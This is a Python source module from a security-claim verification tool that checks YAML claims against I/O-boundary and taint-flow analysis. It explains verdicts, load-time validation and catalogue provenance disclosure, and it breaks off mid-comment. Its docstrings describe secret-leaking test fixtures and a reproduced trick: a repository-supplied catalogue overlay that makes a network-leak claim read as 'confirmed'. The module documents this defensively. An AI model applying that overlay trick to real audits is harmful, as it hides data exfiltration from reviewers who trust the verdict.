# SPDX-License-Identifier: AGPL-3.0-or-later
"""Security claim verification against I/O boundary and taint-flow analysis.

Loads security claims from a YAML file, checks each claim against either the
boundary map (ADR-0016) or taint-flow results (ADR-0017), and returns verdicts.

Claim Format
------------
Claims are YAML files with a ``claims`` list. Each claim specifies:

- ``id``: Unique identifier (e.g., SC-001)
- ``text``: Human-readable description of the security property
- ``constraint``: What to check — one of:

  **Boundary constraint** (ADR-0016):
  - ``boundary``: Which I/O boundary type to check (e.g., "net_send")
  - ``must_not_exist``: If true, the boundary must have zero chains
  - ``max_chains``: Maximum allowed chain count for the boundary

  **Taint-flow constraint** (ADR-0017):
  - ``taint_flow``: Sub-object with taint-flow verification parameters
    - ``source_taint``: Taint label that must not reach the sink zone
    - ``prohibited_sink_zone``: Zone where tainted data must not arrive
    - ``allowed_sanitizers``: List of sanitizer qualified names (optional)

Verdict Types
-------------
- ``confirmed``: Claim was actively checked and held (no violations found)
- ``violated``: Specific evidence contradicts the claim
- ``inconclusive``: Verification couldn't proceed or couldn't be trusted —
  no machine-checkable constraint, broken input, missing catalog, or the
  I/O analysis was blind to the relevant code (empty analysis, or a
  supported language that produced no call edges). Kept distinct from
  ``confirmed`` to close the silent-confirm fall-through (ADR-0033 Phase 3;
  WI-kajil / INV-bitig).

For taint-flow claims the adjudication travels with the verdict rather than
being asserted by this module. Structural analysis produces ``approximate``
confidence; the ADR-0017 §3a data-dependence walk produces ``precise`` where it
confirms a dependence and ``approximate`` / ``ddg_mixed`` where it ran without
confirming one. A verdict's ``analysis_methods`` breakdown and each evidence
row's ``confidence`` / ``analysis_method`` report what actually happened. This
module previously hardcoded the literal ``approximate`` into every violated
verdict, which made a ``precise`` finding indistinguishable from a structural
one at the only surface a user reads.

Load-time validation
---------------------
``load_claims`` validates the claims file before constructing any ``Claim``
(the META-jurig gate): malformed YAML, an unexpected root/claim/constraint
shape, an unknown field name, or a ``constraint.boundary`` outside the
io-boundaries vocabulary each raise :class:`ClaimsFileError` (→ CLI exit 2)
rather than tracebacking or silently producing a degraded verdict stream.

How It Works
------------
1. ``load_claims(path)`` validates and parses the YAML into ``Claim`` objects
2. ``verify_claim(claim, boundary_map)`` checks one claim → ``ClaimVerdict``
3. ``verify_taint_claim(claim, findings)`` checks taint-flow → ``ClaimVerdict``
4. ``verify_claims(claims, boundary_map, findings)`` checks all
"""
from __future__ import annotations

from collections.abc import Iterator, Mapping, Sequence, Set as AbstractSet
from dataclasses import dataclass, field
from pathlib import Path
from typing import TYPE_CHECKING, Any, Optional

if TYPE_CHECKING:
    from .taint import TaintFlowFinding

import yaml

from .edge_types import is_grpc_rpc_implementation
from .io_boundary import (
    KNOWN_IO_BOUNDARIES,
    PRODUCER_OPAQUE_BOUNDARIES,
    BoundaryMap,
    IoBoundaryCatalog,
    classify_call,
)
from .ir import symbol_path_slot
from .paths import classify_test_file, is_migration_file


# Schema version for the ``verify-claims --json`` envelope (WI-nulot / INV-gatog).
# 1.0 introduces the top-level object (schema_version + view + verdicts +
# unsupported_taint_languages) replacing the legacy bare JSON array.
# 1.2 adds the per-verdict ``excluded_flows`` disclosure bucket (WI-bifob).
# Additive: every 1.1 key keeps its meaning, and the new key is an empty dict
# when nothing was excluded, so a 1.1 consumer that ignores it still reads a
# correct verdict — but it would UNDERSTATE what the analysis saw, which is
# why this is a version change rather than a silent field addition.
# 1.3 adds the per-verdict ``flow_origins`` breakdown and a per-evidence-row
# ``source_boundary`` (WI-vazal). Also additive, and deliberately so: the
# alternative considered was RELABELLING database reads away from
# ``untrusted_input``, which would have been a silent semantic change to every
# claim already written against that label. Reporting the split instead means
# no published claim changes meaning and no verdict moves.
# 1.4 adds the per-verdict ``analysis_methods`` breakdown and a per-evidence-row
# ``confidence`` / ``analysis_method`` (INV-karud clause c). Additive, and a
# version change rather than a silent field addition for the same reason 1.2
# was: a 1.3 consumer reading a violated verdict cannot tell a flow the
# ADR-0017 §3a walk confirmed by data dependence from one included by call
# reachability alone, and will keep treating every flow as equally supported.
# This release also stops hardcoding the string ``approximate`` into every
# violated verdict's ``details`` — that literal made the label unobservable
# from BOTH surfaces at once, so no consumer could have noticed the difference.
# 1.5 SPLITS the ``excluded_flows`` bucket keys by which rule fired. NOT purely
# additive, and that is the point: a flow formerly counted under
# ``test_sourced`` may now appear under ``benchmark_sourced`` /
# ``fixture_sourced`` / ``mock_sourced`` / ``test_support_sourced``. Which
# flows are excluded does not change at all — ``paths.classify_test_file`` IS
# ``is_test_file``, the boolean being defined as "reason is not None" — only
# what they are called. A 1.4 consumer summing the dict still gets the right
# total; one keyed on the literal ``test_sourced`` now sees only genuine test
# code, which is what that key always claimed to mean. This release also
# splices ``excluded_flows`` and ``flow_origins`` into the VIOLATED path's
# ``details``, closing WI-bifob's stated but unimplemented contract that
# exclusions are disclosed on both paths.
# 1.6 adds the per-verdict ``sanitized_flows`` count. Sanitized flows now EXIST
# — the propagators emit them labelled instead of pruning them into silence, so
# ``TaintFlowFinding.sanitized`` stops being written ``False`` at every
# construction site and ``verify_taint_claim``'s ``and not f.sanitized`` stops
# being a tautology. Additive: a verdict with no sanitizer on any route reports
# 0, exactly as before. No verdict moves — a sanitized flow was already not
# counted, it was merely not COUNTABLE.
# 1.7 adds the top-level ``dataflow_coverage`` block (INV-karud clause a3):
# per-language data-flow capability with the catalog it would serve, a
# findings-by-analysis-method rollup, and ``inclusion_decided_by``. Additive.
# The block answers a question no per-flow field can: ``analysis_method`` says
# how ONE flow was adjudicated, and a reader cannot interpret "structural"
# without knowing whether the language was capable of anything else.
# 1.8 nests ``sanitizer_scope`` inside that block (INV-karud clause b): the
# catalogue's size, the taint categories it can express, the labels a flow must
# carry to be reportable as sanitized at all, and ``same_function_honoured_by``.
# Additive, and it exists because clause (b)'s evidence is unreadable without
# it — the catalogue is entirely cryptographic, so a repository-wide "0
# sanitized flows" usually means the claims' labels and the sanitizers' labels
# are disjoint sets rather than that nothing was protected. It also publishes
# the one shape the call-graph pass structurally cannot honour: a sanitizer
# called in the same function as the source (WI-fasub), which the DDG pass now
# does honour and which every language without a def/use extractor still misses.
VERIFY_CLAIMS_SCHEMA_VERSION = "1.9"
# WI-kikis: cap on the per-verdict structured drill-down evidence list. A
# violated claim can have thousands of flows (3,969 on the self-corpus); the
# deduplicated ``evidence`` list is bounded to this many DISTINCT flows so the
# JSON stays a reasonable size, while ``evidence_count`` still reports the true
# total and ``details`` discloses the distinct count. 100 distinct source→sink
# paths is far more than a human triages by hand and comfortably covers the
# handful of distinct flows a high-count claim collapses to in practice.
_MAX_EVIDENCE_ROWS = 100


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------


@dataclass
class TaintFlowConstraint:
    """Taint-flow constraint for ADR-0017 claims.

    Attributes:
        source_taint: Taint label that must not reach the sink zone.
        prohibited_sink_zone: Zone where tainted data must not arrive.
        allowed_sanitizers: Sanitizer names that neutralize the taint (optional).
    """

    source_taint: str
    prohibited_sink_zone: str
    allowed_sanitizers: list[str] = None  # type: ignore[assignment]

    def __post_init__(self) -> None:
        if self.allowed_sanitizers is None:
            self.allowed_sanitizers = []


@dataclass
class Claim:
    """A security claim to verify against a boundary map or taint-flow analysis.

    Attributes:
        id: Unique identifier.
        text: Human-readable description.
        constraint_boundary: Which I/O boundary type to check (ADR-0016).
        constraint_must_not_exist: If true, the boundary must have 0 chains.
        constraint_max_chains: Maximum allowed chains for the boundary.
        constraint_taint_flow: Taint-flow constraint (ADR-0017, optional).
    """

    id: str
    text: str
    constraint_boundary: str = ""
    constraint_must_not_exist: bool = False
    constraint_max_chains: Optional[int] = None
    constraint_taint_flow: Optional[TaintFlowConstraint] = None


@dataclass
class ClaimVerdict:
    """Result of verifying a single claim.

    Attributes:
        claim_id: The claim's ID.
        claim_text: The claim's human-readable text.
        verdict: One of "confirmed", "violated", "inconclusive" (ADR-0033
            Phase 3 PR4 / WI-rolol sub-task A). ``confirmed`` means the
            claim was actively checked and held; ``violated`` means
            specific evidence contradicted it; ``inconclusive`` means
            the verification couldn't proceed (no matching constraint,
            broken input data, missing catalog) — distinguished from
            ``confirmed`` to close the silent-confirm fall-through
            class (INV-bitig P0, INV-gobob, INV-mofih, INV-nufob).
        evidence_count: Number of I/O chains that violate the claim (0 if confirmed).
        details: Human-readable explanation.
        evidence: Bounded, deduplicated list of per-flow drill-down records for
            a violated taint claim (WI-kikis). Each entry carries
            ``source_symbol`` / ``sink_symbol`` (the graph node IDs a consumer
            uses to locate the exact edge), the corresponding primitive names,
            and the ``path`` (list of symbol IDs through the call graph). Empty
            for confirmed / inconclusive / boundary verdicts. Capped at
            ``_MAX_EVIDENCE_ROWS`` DISTINCT flows — ``evidence_count`` remains
            the full total, so ``len(evidence) < evidence_count`` signals either
            verbatim-duplicate flows collapsed away or a high-count claim
            truncated to the cap.
        excluded_flows: Counts of flows that MATCHED the claim's constraint but
            were not counted against it, keyed by why (WI-bifob). Empty when
            nothing was excluded. This is a disclosure bucket in the D7 shape —
            a production default plus a labelled, counted account of what the
            default left out — not a silent filter. A silent drop would make
            the tool quieter without making it more honest, and the vanished
            count is exactly what a later session rediscovers as a mystery
            regression. Keys are ``migration_sourced`` plus one per rule that
            ``paths.classify_test_file`` can fire: ``test_sourced``,
            ``mock_sourced``, ``fixture_sourced``, ``benchmark_sourced``,
            ``test_support_sourced``. The split exists because
            ``is_test_file`` is deliberately broad and reporting a ``benches/``
            path as ``test_sourced`` sends the reader looking for a test that
            does not exist. Which flows are excluded is unchanged by the split.
        flow_origins: Counts of the flows this verdict IS about, keyed by the
            io_primitives boundary their source came from (WI-vazal). Empty
            when there are no flows. The taint label alone cannot express
            this: ``AUTO_SOURCE_LABEL_MAP`` collapses ``net_recv``,
            ``ipc_recv`` and ``db_read`` into the single label
            ``untrusted_input``, so "a request body reached the database" and
            "a row read from the database reached the database" were
            indistinguishable — and on an ORM-backed application the second
            dominates. This reports the split WITHOUT relabelling anything,
            so no already-published claim changes meaning. ``declared`` is the
            bucket for YAML-declared sources, which have no boundary.
        sanitized_flows: How many flows matched this claim's label and sink
            zone but were NOT counted against it because a sanitizer lies on
            every route (0 when none). The sibling of ``excluded_flows``, and
            the same D7 shape: the barrier used to prune the flow into
            silence, so a developer reading a clean verdict could not tell "no
            path exists" from "a path exists and your ``encrypt()`` call is
            what makes it safe". Only the second tells them what breaks if
            they delete that call.
        analysis_methods: Counts of the flows this verdict IS about, keyed by
            HOW each was adjudicated (INV-karud clause c). Empty when there
            are no counted flows. Same shape and rationale as
            ``flow_origins``: the pipeline computed this and the consumer
            could not see it. ``ddg`` means the ADR-0017 §3a walk found a data
            dependence; ``ddg_mixed`` means the walk ran and did not confirm
            one, so inclusion rests on call-graph reachability; ``structural``
            means no reaching-def data existed for the language and no walk
            was possible. ``confidence`` collapses the last two into
            ``approximate``, which is why this is the finer axis and the one
            worth carrying — "the analysis looked and found nothing" and "the
            analysis could not look" are different facts about a security
            verdict.
    """

    claim_id: str
    claim_text: str
    verdict: str  # axis: bounded-enum — "confirmed" / "violated" / "inconclusive"
    evidence_count: int = 0
    details: str = ""
    evidence: list[dict[str, Any]] = field(default_factory=list)
    excluded_flows: dict[str, int] = field(default_factory=dict)
    flow_origins: dict[str, int] = field(default_factory=dict)
    analysis_methods: dict[str, int] = field(default_factory=dict)
    sanitized_flows: int = 0

    def to_dict(self) -> dict:
        """Serialize to JSON-friendly dict."""
        return {
            "claim_id": self.claim_id,
            "claim_text": self.claim_text,
            "verdict": self.verdict,
            "evidence_count": self.evidence_count,
            "details": self.details,
            "evidence": self.evidence,
            "excluded_flows": self.excluded_flows,
            "flow_origins": self.flow_origins,
            "analysis_methods": self.analysis_methods,
            "sanitized_flows": self.sanitized_flows,
        }


@dataclass
class BoundaryCoverage:
    """Whether the I/O boundary analysis is trustworthy enough to *confirm* a
    zero-chain ``must_not_exist`` / within-limit ``max_chains`` claim.

    A clean (zero-chain) boundary verdict only means "this boundary is unused"
    if the analysis could actually have detected the I/O. Three blind spots make
    a clean verdict untrustworthy (WI-kajil / INV-bitig P0):

    * the analysis produced no call edges at all (empty repo, wrong cwd, or an
      unanalyzable input) — nothing could be traced to an I/O primitive; or
    * a *supported* language (one with an I/O catalog) was analyzed but
      produced zero call edges, so ``io_boundary`` saw none of its I/O — the
      F69.A1 missing-edge-production case (e.g. the JS body-call gap); or
    * the analysis called out to a module the catalog has no opinion about —
      ``requests``, ``sqlmodel``, ``boto3``. The first two spots ask "did this
      language produce ANY call edges", and a language producing hundreds of
      thousands passes them while every third-party I/O call goes unexamined.
      Measured live on unmodified upstream repos: poetry's ``src/poetry``
      returned ``confirmed`` for "never sends data over the network" (14 files
      import ``requests``) *in the same run* that correctly reported 20
      ``fs_read`` chains, so the analysis was demonstrably not blind — it
      looked, could not classify ``requests``, and reported the silence as
      safety. See :func:`_uncatalogued_external_modules` for the predicate and
      the residual it deliberately leaves open.

    When ``complete`` is ``False``, :func:`verify_claim` returns
    ``inconclusive`` instead of ``confirmed`` so verify-claims never asserts a
    boundary is unused on an analysis that couldn't see it. ``reason`` is a
    human-readable explanation surfaced in the verdict details.
    """

    complete: bool
    reason: str = ""


# ---------------------------------------------------------------------------
# Claim loading
# ---------------------------------------------------------------------------


class ClaimsFileError(Exception):
    """Raised by :func:`load_claims` when the claims YAML cannot be loaded
    as a well-formed set of claims.

    Covers the four failure classes that previously either tracebacked or
    silently degraded the verdict stream — the META-jurig ``load_claims``
    validation gate:

    * malformed YAML (``yaml.YAMLError``) — INV-zurih;
    * an unexpected root / claim / constraint shape — WI-fuhaf;
    * a ``constraint.boundary`` outside the io-boundaries vocabulary —
      INV-gobob / WI-ruzib;
    * an unrecognized field name, e.g. the typo ``constrant`` — WI-bopoz.

    :func:`hypergumbo_core.cli.cmd_verify_claims` catches it, prints
    ``Error: <message>`` to stderr, and exits ``2`` — distinct from ``1``
    (a genuine ``violated`` verdict) so a CI gate keyed on ``rc == 0`` still
    fails closed on a typo'd claim without misreporting a security
    regression, and distinct from ``0`` so malformed input can never read
    as "all confirmed".
    """


# Field-name allowlists for the claims YAML (WI-bopoz). An unrecognized key
# is a typo or a misremembered field; both previously loaded a
# defaults-populated Claim whose ``inconclusive`` verdict was
# indistinguishable from a claim that legitimately lacks a checker.
# Rejecting unknown keys at load time makes the typo loud.
_ALLOWED_TOP_LEVEL_KEYS: frozenset[str] = frozenset({"claims", "extra_catalogs"})
_ALLOWED_CLAIM_KEYS: frozenset[str] = frozenset({"id", "text", "constraint"})
_ALLOWED_CONSTRAINT_KEYS: frozenset[str] = frozenset(
    {"boundary", "must_not_exist", "max_chains", "taint_flow"},
)
_ALLOWED_TAINT_FLOW_KEYS: frozenset[str] = frozenset(
    {"source_taint", "prohibited_sink_zone", "allowed_sanitizers"},
)


def _did_you_mean(value: str, vocabulary) -> str:
    """Return a ``' Did you mean: ...?'`` suffix for close matches, else ''.

    Mirrors the subcommand did-you-mean hint in ``cli.py`` (difflib,
    cutoff 0.5) so a near-miss boundary or field name gets a correction.
    """
    import difflib

    close = difflib.get_close_matches(value, sorted(vocabulary), n=3, cutoff=0.5)
    if close:
        return f" Did you mean: {', '.join(close)}?"
    return ""


def _reject_unknown_keys(observed, allowed: frozenset[str], *, where: str) -> None:
    """Raise :class:`ClaimsFileError` if ``observed`` has a key outside ``allowed``.

    The message lists the offending key(s), the allowed set, and a
    did-you-mean hint for the first unknown key (WI-bopoz).
    """
    unknown = sorted(str(key) for key in observed if key not in allowed)
    if not unknown:
        return
    listed = ", ".join(repr(key) for key in unknown)
    allowed_list = ", ".join(sorted(allowed))
    hint = _did_you_mean(unknown[0], allowed)
    raise ClaimsFileError(
        f"unknown {where} field(s): {listed} (allowed: {allowed_list}).{hint}",
    )


def load_extra_catalog_paths(
    path: Path,
) -> tuple[list[Path], list[Path], list[Path], list[Path]]:
    """Read ``extra_catalogs:`` from a claims YAML and return its path lists.

    The claims file may declare project-local taint catalog files under a
    top-level ``extra_catalogs`` key (WI-votan)::

        extra_catalogs:
          sources:
            - taint/project_sources.yaml
            - taint/extra_sources_dir
          sinks:
            - taint/project_sinks.yaml
          sanitizers: []
          io_primitives:
            - overlays/python-http-clients.yaml

    Each entry is a YAML file or a directory of YAML files.  Relative
    paths resolve against the claims-file directory so a repo can keep
    its extra catalogs beside the claims document.

    Returns ``(sources, sinks, sanitizers, io_primitives)`` — each a list
    of ``Path`` values that callers can concatenate onto CLI-supplied
    paths.  The first three feed
    :func:`hypergumbo_core.taint.load_full_taint_catalog`; the fourth
    feeds :func:`hypergumbo_core.io_boundary.load_catalog` (INV-fotav).

    ``io_primitives`` is read HERE rather than through a second loader
    because ``extra_catalogs:`` is already the one place a claims file
    declares project-local knowledge — the boundary arm was simply never
    given a key in it, even though ADR-0017 established the pattern for
    the taint arm.
    """
    content = path.read_text(encoding="utf-8")
    data = yaml.safe_load(content) or {}
    extras = data.get("extra_catalogs") or {}
    base_dir = path.parent

    def _resolve_rel(raw: object) -> list[Path]:
        if not raw:
            return []
        if not isinstance(raw, list):
            return []
        out: list[Path] = []
        for entry in raw:
            if not isinstance(entry, str):
                continue
            pp = Path(entry)
            if not pp.is_absolute():
                pp = base_dir / pp
            out.append(pp)
        return out

    return (
        _resolve_rel(extras.get("sources")),
        _resolve_rel(extras.get("sinks")),
        _resolve_rel(extras.get("sanitizers")),
        _resolve_rel(extras.get("io_primitives")),
    )


def _parse_taint_flow(
    taint_flow_data: object,
    claim_id: str,
) -> Optional[TaintFlowConstraint]:
    """Validate and build the optional ``taint_flow`` sub-constraint (ADR-0017).

    ``None`` (key absent or explicit null) yields ``None``; a non-mapping or
    an unrecognized key raises :class:`ClaimsFileError` rather than being
    silently ignored.
    """
    if taint_flow_data is None:
        return None
    if not isinstance(taint_flow_data, dict):
        raise ClaimsFileError(
            f"taint_flow in claim '{claim_id}' must be a mapping, "
            f"got {type(taint_flow_data).__name__}.",
        )
    _reject_unknown_keys(
        taint_flow_data.keys(),
        _ALLOWED_TAINT_FLOW_KEYS,
        where=f"taint_flow in claim '{claim_id}'",
    )
    return TaintFlowConstraint(
        source_taint=taint_flow_data.get("source_taint", ""),
        prohibited_sink_zone=taint_flow_data.get("prohibited_sink_zone", ""),
        allowed_sanitizers=taint_flow_data.get("allowed_sanitizers", []),
    )


#: The catalogue layers a verdict can rest on, in ASCENDING precedence within
#: each kind. Fixed and always emitted so a consumer never has to read a
#: missing key as "none" — the same convention ``dataflow_coverage`` follows.
_PROVENANCE_KINDS: tuple[str, ...] = (
    "io_primitives",
    "taint_sources",
    "taint_sinks",
    "taint_sanitizers",
)


def catalog_provenance(
    layers: "Mapping[str, tuple[Sequence[Path], Sequence[Path]]]",
) -> dict[str, Any]:
    """Record which catalogues a verdict was computed against (INV-zosun).

    THE PROBLEM THIS EXISTS FOR. A ``confirmed`` reached against the shipped
    catalogue and a ``confirmed`` reached against a repo-supplied overlay were
    byte-identical, in the text output and in the ``--json`` envelope alike.
    The only signal was one stderr line naming the overlay path: not attached
    to the verdict, absent from the envelope, and gone the instant anyone
    redirected the output.

    THAT IS NOT COSMETIC, because a catalogue row is not a detection-only
    grant. Since INV-buzab a call the catalogue CLASSIFIED is what *examined*
    means, so a row carrying the wrong boundary converts an unexamined call
    into an examined one that produces no chain for the boundary actually
    claimed. Measured on one fixture posting ``os.environ["API_KEY"]`` through
    ``requests.post``, claim "never sends data over the network", the middle
    run being the control that proves the row matched::

        no overlay                            inconclusive   rc 2
        requests.post declared net_send       violated       rc 1
        requests.post declared fs_read        CONFIRMED      rc 0

    THE TWO LAYERS ARE KEPT APART ON PURPOSE. A catalogue passed on the
    command line comes from whoever RAN the tool. One reached through the
    claims file's ``extra_catalogs:`` travels WITH the repository — and when
    the claims file and its catalogues live inside the tree under analysis,
    the subject is supplying its own grading criteria. Reproduced: a directory
    holding ``main.py``, ``claims.yaml`` and an overlay filing
    ``requests.post`` under ``fs_read`` returns ``confirmed`` rc 0, where the
    same repo without the ``extra_catalogs:`` line returns ``inconclusive``
    rc 2. Collapsing the layers would report THAT a catalogue was used while
    hiding WHO supplied it, which is the more decision-relevant half.

    THIS CHANGES NO VERDICT. It is disclosure, deliberately chosen over
    restriction: refusing user catalogues would close the case ADR-0016 §27
    created the overlay channel for (cataloguing third-party egress so it
    becomes visible), and the honest gap was never that users can extend the
    catalogue — it was that doing so left no trace on the answer.

    Args:
        layers: kind -> (CLI-supplied paths, claims-file-supplied paths).
            Every key in :data:`_PROVENANCE_KINDS` is emitted whether or not
            it appears here.

    Returns:
        ``{"user_supplied": bool, "layers": {kind: {"cli": [...],
        "claims_file": [...]}}}`` — paths as strings, exactly as the user
        wrote them, so a reader can find the file.
    """
    out: dict[str, dict[str, list[str]]] = {}
    any_user = False
    for kind in _PROVENANCE_KINDS:
        cli_paths, claims_paths = layers.get(kind, ((), ()))
        cli_list = [str(p) for p in cli_paths]
        claims_list = [str(p) for p in claims_paths]
        any_user = any_user or bool(cli_list) or bool(claims_list)
        out[kind] = {"cli": cli_list, "claims_file": claims_list}
    return {"user_supplied": any_user, "layers": out}


def render_catalog_provenance_text(provenance: dict[str, Any]) -> list[str]:
    """The same disclosure for a reader who did not ask for JSON.

    A disclosure that exists only under ``--json`` is half shipped — this
    file's own precedent, recorded on INV-karud (a3) when WI-bifob's exclusion
    bucket reached the dataclass and never the text renderer. Renders to
    nothing when the run used only the shipped catalogue, so ordinary output
    is unchanged.
    """
    if not provenance.get("user_supplied"):
        return []
    lines = [
        "",
        "NOTE: these verdicts were computed against USER-SUPPLIED catalogue "
        "input.",
    ]
    for kind, layer in sorted(provenance.get("layers", {}).items()):
        for origin, label in (("cli", "CLI flag"),
                              ("claims_file", "claims-file extra_catalogs")):
            for path in layer.get(origin, []):
                lines.append(f"  {kind}: {path}  [{label}]")
    lines.append(
        "  A verdict is only as truthful as the catalogue behind it: a row "
        "with the wrong",
    )
    lines.append(
        "  boundary makes a call count as EXAMINED without producing a chain "
        "for the",
    )
    lines.append(
        "  boundary claimed. Where a claims-file catalogue ships inside the "
        "analysed repo,",
    )
    lines.append("  the repository is supplying its own criteria (INV-zosun).")
    return lines


def validate_taint_flow_vocabulary(
    claims: list["Claim"],
    source_labels: "AbstractSet[str]",
    sink_zones: "AbstractSet[str]",
) -> None:
    """Reject a ``taint_flow`` claim naming a label or zone nothing can match.

    THE SECOND HALF OF A RULE THAT SHIPPED WITH ONLY ITS FIRST HALF
    (INV-todas). ``load_claims`` has validated ``constraint.boundary`` against
    ``KNOWN_IO_BOUNDARIES`` since INV-gobob / WI-ruzib, and the comment there
    states the mechanism precisely: *"An unknown value here would otherwise
    make verify_claim's boundary_map.entries.get return None → chain_count 0 →
    silent 'confirmed'."* The taint arm has the identical shape —
    :func:`verify_claim` keeps only findings where
    ``f.taint_label == tf.source_taint and f.sink_zone ==
    tf.prohibited_sink_zone`` — and got no check, so the reasoning was written
    down and applied to one of the two constraint vocabularies.

    Measured on the shipped CLI, one fixture that really leaks
    (``os.environ["API_KEY"]`` written through ``open(...).write``), with the
    boundary arm as a control behaving correctly in the same command::

        source_taint: secret_material          -> confirmed  rc 0   FAILS OPEN
        prohibited_sink_zone: host_filesystem  -> confirmed  rc 0   FAILS OPEN
        boundary: net_sends                    -> Error      rc 2   fails CLOSED
        (correct: host_secret / host_fs)       -> violated   rc 1   control

    WHY IT TAKES THE VOCABULARIES AS ARGUMENTS INSTEAD OF DERIVING THEM.
    ``KNOWN_IO_BOUNDARIES`` is a constant; these are not. A project-local
    ``--taint-sinks`` file may declare a zone no built-in catalogue mentions,
    so the sets must come from the RESOLVED catalogue — which is why the caller
    is ``cmd_verify_claims`` after ``load_full_taint_catalog``, not
    ``load_claims``. Passing them in also keeps the heavy ``taint`` import out
    of this module's import path.

    DISCLOSED COST: because the resolved catalogue is assembled after the
    behavior map, a typo is reported after analysis rather than before it.
    That is strictly better than confirming, and worse than failing fast;
    hoisting the catalogue load ahead of ``_get_or_run_analysis`` is filed
    separately rather than folded into a security fix.

    Raises:
        ClaimsFileError: naming the offending value, the full vocabulary, and
            a did-you-mean suffix — the vocabulary is not discoverable
            anywhere else on the error path.
    """
    for claim in claims:
        tf = claim.constraint_taint_flow
        if tf is None:
            continue
        for value, vocabulary, field_name in (
            (tf.source_taint, source_labels, "source_taint"),
            (tf.prohibited_sink_zone, sink_zones, "prohibited_sink_zone"),
        ):
            # An EMPTY value is a different defect (an absent key) and is left
            # to the existing shape validation; refusing it here would change
            # the error a malformed claim already gets.
            if not value or value in vocabulary:
                continue
            raise ClaimsFileError(
                f"unknown {field_name} '{value}' in claim '{claim.id}'; "
                f"valid values: {', '.join(sorted(vocabulary))}."
                + _did_you_mean(value, vocabulary),
            )


def _parse_claim(entry: object, index: int) -> Claim:
    """Validate and build one :class:`Claim` from a raw YAML entry.

    Enforces the per-entry half of the load gate: the entry must be a
    mapping with only allowed keys; ``constraint`` (if present) must be a
    mapping with only allowed keys; a present ``constraint.boundary`` must
    be in :data:`~hypergumbo_core.io_boundary.KNOWN_IO_BOUNDARIES`.
    """
    if not isinstance(entry, dict):
        raise ClaimsFileError(
            f"claim #{index + 1} must be a mapping, "
            f"got {type(entry).__name__}.",
        )
    claim_id = entry.get("id") or f"#{index + 1}"
    _reject_unknown_keys(
        entry.keys(), _ALLOWED_CLAIM_KEYS, where=f"claim '{claim_id}'",
    )

    constraint = entry.get("constraint")
    if constraint is None:
        constraint = {}
    if not isinstance(constraint, dict):
        raise ClaimsFileError(
            f"constraint in claim '{claim_id}' must be a mapping, "
            f"got {type(constraint).__name__}.",
        )
    _reject_unknown_keys(
        constraint.keys(),
        _ALLOWED_CONSTRAINT_KEYS,
        where=f"constraint in claim '{claim_id}'",
    )

    # Boundary-vocabulary check (INV-gobob / WI-ruzib). Validate against the
    # canonical universe, NOT the keys present in a given boundary map: a
    # repo with zero net_send chains must still accept a
    # ``must_not_exist: net_send`` claim and confirm it. An unknown value
    # here would otherwise make verify_claim's ``boundary_map.entries.get``
    # return None → chain_count 0 → silent "confirmed".
    boundary = constraint.get("boundary", "") or ""
    if boundary and boundary not in KNOWN_IO_BOUNDARIES:
        raise ClaimsFileError(
            f"unknown boundary '{boundary}' in claim '{claim_id}'; valid "
            f"boundaries: {', '.join(sorted(KNOWN_IO_BOUNDARIES))}."
            + _did_you_mean(boundary, KNOWN_IO_BOUNDARIES),
        )

    taint_flow = _parse_taint_flow(constraint.get("taint_flow"), claim_id)

    return Claim(
        id=entry.get("id", ""),
        text=entry.get("text", ""),
        constraint_boundary=boundary,
        constraint_must_not_exist=constraint.get("must_not_exist", False),
        constraint_max_chains=constraint.get("max_chains"),
        constraint_taint_flow=taint_flow,
    )


def load_claims(path: Path) -> list[Claim]:
    """Load and validate security claims from a YAML file.

    Validates the file before constructing any :class:`Claim` (the
    META-jurig ``load_claims`` gate), raising :class:`ClaimsFileError` on
    the first failure so a malformed or typo'd claims file errors loudly
    instead of tracebacking or silently producing a degraded verdict
    stream:

    1. **Readability / shape** (WI-fuhaf): ``path`` must be a file (not a
       directory), decode as UTF-8 text, and parse to a top-level mapping
       with a list-valued ``claims:`` key. An empty file, ``{}``,
       ``claims: []``, ``claims: null`` / ``~``, and an absent ``claims:``
       key all mean "no claims" and load to ``[]``.
    2. **YAML well-formedness** (INV-zurih): ``yaml.YAMLError`` is caught
       and re-raised naming the file and reason.
    3. **Field names** (WI-bopoz): every top-level, claim, constraint, and
       taint-flow key is checked against an allowlist with a did-you-mean
       hint.
    4. **Boundary vocabulary** (INV-gobob / WI-ruzib): a present
       ``constraint.boundary`` must be one of
       :data:`~hypergumbo_core.io_boundary.KNOWN_IO_BOUNDARIES`.

    Args:
        path: Path to the claims YAML file.

    Returns:
        List of Claim objects (possibly empty).

    Raises:
        ClaimsFileError: on any of the validation failures above.
    """
    if path.is_dir():
        raise ClaimsFileError(
            f"claims path is a directory, not a file: {path}",
        )
    try:
        content = path.read_text(encoding="utf-8")
    except UnicodeDecodeError as exc:
        raise ClaimsFileError(
            f"claims file is not valid UTF-8 text: {path}",
        ) from exc
    try:
        data = yaml.safe_load(content)
    except yaml.YAMLError as exc:
        raise ClaimsFileError(
            f"could not parse claims file {path}: {exc}",
        ) from exc

    if data is None:
        data = {}
    if not isinstance(data, dict):
        raise ClaimsFileError(
            f"claims file must have a top-level mapping with a 'claims:' key, "
            f"got {type(data).__name__}: {path}",
        )
    _reject_unknown_keys(
        data.keys(), _ALLOWED_TOP_LEVEL_KEYS, where="top-level",
    )

    raw_claims = data.get("claims")
    if raw_claims is None:
        raw_claims = []
    if not isinstance(raw_claims, list):
        raise ClaimsFileError(
            f"'claims:' must be a list, got {type(raw_claims).__name__}: {path}",
        )

    return [_parse_claim(entry, index) for index, entry in enumerate(raw_claims)]


# ---------------------------------------------------------------------------
# Verification
# ---------------------------------------------------------------------------


# Analyzer-produced call edge types used to decide per-language I/O coverage.
# A deliberately registry-clean subset of the edge types ``io_boundary``'s
# ``tag_io_boundaries`` scans (all relationship axis). It omits the
# bridge-family endpoint_shape values (``cgo_bridge``/``wasm_bridge``/...)
# that the tagger lists defensively: those fold into the canonical ``calls``
# relationship (edge_types.py), so a folded FFI edge is already counted via
# ``calls`` — and they are not relationship-axis edge types, so listing them
# here would (correctly) fail the ADR-0023 drift linter. The folded gRPC
# RPC-implementation edge (``implements`` + ``meta['protocol']='grpc'``,
# audit-findings 0016) is counted via the is_grpc_rpc_implementation predicate
# at the loop below, not membership. This set answers "did the analyzer extract
# call structure for this language", which is what the WI-kajil blindness
# signal needs.
_COVERAGE_CALL_EDGE_TYPES: frozenset[str] = frozenset({
    "calls",
    "imports",
    "module_attr_ref",
    "event_publishes",
})


#: How many uncatalogued modules to name in the reason string. A reason is read by
